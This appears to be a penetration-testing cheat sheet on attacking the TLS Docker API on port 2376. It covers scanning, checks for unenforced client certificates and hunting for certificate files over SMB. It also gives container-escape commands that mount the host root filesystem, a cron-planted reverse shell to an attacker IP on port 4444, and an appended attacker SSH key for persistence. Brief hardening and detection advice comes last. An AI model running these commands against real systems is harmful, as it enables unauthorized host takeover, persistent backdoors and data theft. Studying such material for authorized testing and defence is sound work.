# DOCKER API SSL ENUMERATION (Port 2376/TCP)

## SERVICE OVERVIEW
```
Docker API over SSL/TLS (encrypted)
- Port: 2375/TCP (Docker API unencrypted - see separate file)
- Port: 2376/TCP (Docker API encrypted) ← THIS PORT
- Remote Docker daemon management
- Requires TLS certificates for authentication
- Full container control if compromised
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p2376 <IP>                            # Service/Version detection
curl -k https://<IP>:2376/version               # Docker version
openssl s_client -connect <IP>:2376             # SSL/TLS connection
```

## NMAP ENUMERATION
```bash
# Docker API detection
nmap -sV -p2376 <IP>                            # Version detection
nmap -p2376 --script ssl-cert <IP>              # SSL certificate info

# Comprehensive scan
nmap -sV -p2375,2376 --script "docker-*,ssl-*" <IP> -oA docker_api_scan
```

## DOCKER API ACCESS (WITH CERTIFICATES)
```bash
# Docker API requires client certificates
# Three files needed:
# - ca.pem (Certificate Authority)
# - cert.pem (Client certificate)
# - key.pem (Client private key)

# Connect with certificates
curl --cert cert.pem --key key.pem --cacert ca.pem \
  https://<IP>:2376/version

# Docker client with certificates
docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H tcp://<IP>:2376 version

# Set environment variables
export DOCKER_TLS_VERIFY=1
export DOCKER_CERT_PATH=/path/to/certs
export DOCKER_HOST=tcp://<IP>:2376
docker version
```

## CHECK IF TLS VERIFICATION IS ENFORCED
```bash
# Test without certificates (should fail if secured)
curl -k https://<IP>:2376/version

# If this works, TLS is NOT properly enforced!
# Server accepts connections without client certificates

# Test with docker client (no certs)
docker -H tcp://<IP>:2376 version
# If successful, server is misconfigured
```

## ENUMERATE DOCKER ENVIRONMENT
```bash
# With valid certificates or misconfigured server:

# Docker version and info
curl -k --cert cert.pem --key key.pem --cacert ca.pem \
  https://<IP>:2376/version

curl -k --cert cert.pem --key key.pem --cacert ca.pem \
  https://<IP>:2376/info

# List containers
curl -k --cert cert.pem --key key.pem --cacert ca.pem \
  https://<IP>:2376/containers/json

# List images
curl -k --cert cert.pem --key key.pem --cacert ca.pem \
  https://<IP>:2376/images/json

# List volumes
curl -k --cert cert.pem --key key.pem --cacert ca.pem \
  https://<IP>:2376/volumes

# List networks
curl -k --cert cert.pem --key key.pem --cacert ca.pem \
  https://<IP>:2376/networks
```

## DOCKER CLIENT ENUMERATION
```bash
# Using docker client (if certificates available)

# List containers
docker -H tcp://<IP>:2376 --tlsverify ps -a

# List images
docker -H tcp://<IP>:2376 --tlsverify images

# Docker info
docker -H tcp://<IP>:2376 --tlsverify info

# Inspect container
docker -H tcp://<IP>:2376 --tlsverify inspect <container_id>
```

## EXPLOITATION (IF CERTIFICATES OBTAINED)
```bash
# Create privileged container with host filesystem mounted
docker -H tcp://<IP>:2376 --tlsverify run -it --rm \
  -v /:/hostfs alpine chroot /hostfs /bin/bash

# Alternative: Create container with privileged flag
docker -H tcp://<IP>:2376 --tlsverify run -it --rm \
  --privileged --net=host --pid=host alpine /bin/sh

# Execute commands in running container
docker -H tcp://<IP>:2376 --tlsverify exec -it <container_id> /bin/bash
```

## OBTAIN CERTIFICATES (IF FILE ACCESS)
```bash
# Docker certificates typically stored in:
# Linux:
~/.docker/ca.pem
~/.docker/cert.pem
~/.docker/key.pem
/etc/docker/ca.pem
/etc/docker/cert.pem
/etc/docker/key.pem

# Windows:
C:\Users\<user>\.docker\ca.pem
C:\Users\<user>\.docker\cert.pem
C:\Users\<user>\.docker\key.pem

# Search for certificates
find / -name "ca.pem" 2>/dev/null
find / -name "*docker*" -name "*.pem" 2>/dev/null

# Download via SMB, FTP, web exposure, etc.
smbclient //<IP>/share -U user%pass
> get .docker/ca.pem
> get .docker/cert.pem
> get .docker/key.pem
```

## CERTIFICATE VALIDATION
```bash
# Verify certificate validity
openssl x509 -in cert.pem -text -noout

# Check certificate expiration
openssl x509 -in cert.pem -noout -dates

# Verify certificate chain
openssl verify -CAfile ca.pem cert.pem
```

## COMMON MISCONFIGURATIONS
```
☐ TLS verification not enforced (accepts connections without certs)
☐ Self-signed certificates with weak keys
☐ Certificates stored in web-accessible locations
☐ Same certificates used across multiple hosts
☐ No certificate revocation
☐ Docker daemon exposed to internet (should be VPN/internal only)
☐ Overly permissive certificate authentication
☐ Certificates in backup files
☐ Certificates in git repositories
☐ No certificate rotation policy
```

## QUICK WIN CHECKLIST
```
☐ Scan for Docker API SSL on port 2376
☐ Test if TLS verification is enforced
☐ Check SSL certificate details
☐ Search for exposed certificate files (SMB, FTP, web)
☐ Test connection without certificates (misconfiguration)
☐ If certificates obtained: enumerate containers/images
☐ Create privileged container with host filesystem access
☐ Escape container to host OS
☐ Look for secrets in container environment variables
☐ Check for vulnerabilities in running containers
```

## ONE-LINER ENUMERATION
```bash
# Quick check if TLS is enforced
curl -k https://<IP>:2376/version

# If successful (no certs required), exploit:
curl -k https://<IP>:2376/containers/json
```

## SECURITY IMPLICATIONS
```
RISKS:
- Full control over Docker daemon
- Container escape to host OS
- Access to all containers and images
- Secrets exposure (environment variables, volumes)
- Lateral movement via containers
- Privileged container creation
- Data exfiltration from volumes
- Denial of service (stop/remove containers)

ATTACK CHAIN:
1. Find exposed Docker API on 2376
2. Test if TLS verification enforced
3. Obtain certificates (file access, backup, git)
4. Connect to Docker API
5. Create privileged container
6. Mount host filesystem (/:/hostfs)
7. Chroot into host filesystem
8. Full host OS access
9. Enumerate network (container bridge)
10. Pivot to other containers/systems

RECOMMENDATIONS:
- Never expose Docker API to internet
- Use VPN or SSH tunnel for remote access
- Enforce TLS with client certificate verification
- Rotate certificates regularly
- Use strong certificate keys (4096-bit RSA or ECDSA)
- Implement least privilege (restrict API endpoints)
- Monitor Docker API access logs
- Use Docker socket proxy (e.g., tecnativa/docker-socket-proxy)
- Enable Docker Content Trust (image signing)
- Regular security audits
```

## PRIVILEGE ESCALATION VIA DOCKER
```bash
# After gaining Docker access:

# Method 1: Privileged container with host mount
docker -H tcp://<IP>:2376 run -it --rm -v /:/mnt --privileged alpine

# Inside container:
chroot /mnt /bin/bash
# Now you have root shell on host

# Method 2: Create cron job on host
docker -H tcp://<IP>:2376 run -it --rm -v /etc/cron.d:/mnt alpine
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"' > /mnt/backdoor

# Method 3: Add SSH key to host
docker -H tcp://<IP>:2376 run -it --rm -v /root:/mnt alpine
echo "ssh-rsa AAAA...attacker@kali" >> /mnt/.ssh/authorized_keys
```

## DOCKER API ENDPOINTS
```bash
# Useful Docker API endpoints:

# Info and version
GET /version
GET /info
GET /_ping

# Containers
GET /containers/json                             # List containers
GET /containers/<id>/json                        # Inspect container
POST /containers/create                          # Create container
POST /containers/<id>/start                      # Start container
POST /containers/<id>/exec                       # Execute in container
GET /containers/<id>/logs                        # Get container logs

# Images
GET /images/json                                 # List images
POST /images/create?fromImage=<image>            # Pull image

# Volumes
GET /volumes                                     # List volumes

# Networks
GET /networks                                    # List networks
```

## TOOLS
```bash
# cURL with certificates
curl --cert cert.pem --key key.pem --cacert ca.pem https://<IP>:2376/version

# Docker client
docker -H tcp://<IP>:2376 --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem version

# OpenSSL
openssl s_client -connect <IP>:2376

# Nmap
nmap -sV -p2376 --script docker-version <IP>

# docker-api-scanner (custom tool)
# Search GitHub for Docker API scanners
```

## DOCKER API WITHOUT CERTIFICATES (EXPLOIT)
```bash
# If misconfigured (no cert validation):

# List containers
curl -k https://<IP>:2376/containers/json

# Create privileged container
curl -k -X POST https://<IP>:2376/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh"],
    "AttachStdin": true,
    "AttachStdout": true,
    "AttachStderr": true,
    "Tty": true,
    "OpenStdin": true,
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/hostfs"]
    }
  }'

# Start container
curl -k -X POST https://<IP>:2376/containers/<id>/start

# Attach to container
docker -H tcp://<IP>:2376 attach <id>
```

## DEFENSE DETECTION
```bash
# Monitor for Docker API abuse:
# - Connections to port 2376 from unexpected IPs
# - Container creation/execution from unknown sources
# - Privileged container creation
# - Host filesystem mounts
# - Unusual image pulls

# Docker daemon logs
journalctl -u docker.service -f

# Check Docker API access
docker events --since '1h' --filter 'type=container'

# Audit Docker configuration
docker system events --filter 'type=daemon'
```

## REFERENCE - DOCKER API (PORT 2375)
```bash
# For unencrypted Docker API, see:
# SERVICE ENUM/2375 Docker API.md

# Port 2375: Unencrypted (plaintext)
# Port 2376: Encrypted (TLS/SSL)

# Best practice: Use 2376 with client certificate verification
```
